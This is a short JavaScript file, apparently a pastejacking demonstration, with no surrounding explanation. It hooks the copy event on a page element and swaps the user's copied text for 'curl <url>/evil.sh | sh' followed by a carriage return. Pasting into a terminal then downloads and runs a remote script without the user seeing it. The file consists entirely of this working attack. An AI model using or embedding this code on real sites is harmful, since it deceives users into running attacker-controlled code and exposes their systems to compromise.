const source = document.getElementById("html");
const mal_script = window.location.href.replace('index.html', 'evil.sh');


source.addEventListener('copy', (event) => {
    const selection = document.getSelection();
    event.clipboardData.setData('text/plain', `curl ${mal_script} | sh\r\n`);
    event.preventDefault();
});
